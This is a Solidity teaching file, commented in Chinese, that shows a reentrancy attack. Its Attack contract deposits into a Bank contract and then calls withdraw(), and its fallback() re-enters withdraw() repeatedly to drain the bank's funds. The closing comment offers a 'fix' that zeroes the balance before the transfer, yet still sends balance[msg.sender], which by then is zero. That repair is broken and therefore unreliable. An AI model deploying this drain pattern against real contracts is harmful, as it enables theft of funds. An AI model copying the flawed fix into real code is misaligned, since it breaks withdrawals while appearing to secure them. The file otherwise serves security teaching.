// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

//该案例重入攻击的逻辑
//1.先部署Bank合约，调用deposit函数并充值
//2.部署Attack合约
//3.在attack()函数中调用了Bank合约的withdraw()，此次转向Bank合约，在withdraw()方法中的msg.sender.call()这一行，call()函数会找Attack合约中的receive(),
//若没有则看是否有fallback(),在我们这个攻击合约中，有fallback()，则call()函数会调用fallback()。
//4.在本来的fallback()函数中是写的正确的逻辑，不会导致重入攻击，但我们这个攻击合约中的fallback()中的逻辑会导致一直withdraw，直到将全部的钱转走。

import "./Bank.sol";

import "hardhat/console.sol";
contract Attack {
    Bank bank;

    constructor(address _bank) payable {
        bank = Bank(_bank);
    }

    fallback() external payable {
        console.log("fallback");
        console.log("fallback bank.getBalance()", bank.getBalance());
        if(bank.getBalance() > 0 ether){//这里要注意，余额要大于下一次的bank.withdraw()的金额
            bank.withdraw();
        }
    }

    function attack() public payable {
        console.log("attack");
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    function initAmount() public payable {

    }

}
//如何修复
//最简单的方式是将被攻击的合约Bank合约里面的withdraw()方法balance[msg.sender] = 0这一行放到 (bool success,) = msg.sender.call{value: balance[msg.sender]}("")上面。更改后的函数如下
//提款msg.sender的全部ether
//    function withdraw() public {
//        require(balance[msg.sender] > 0);
//        balance[msg.sender] = 0;
//        (bool success,) = msg.sender.call{value: balance[msg.sender]}("");
//        require(success);
//    }

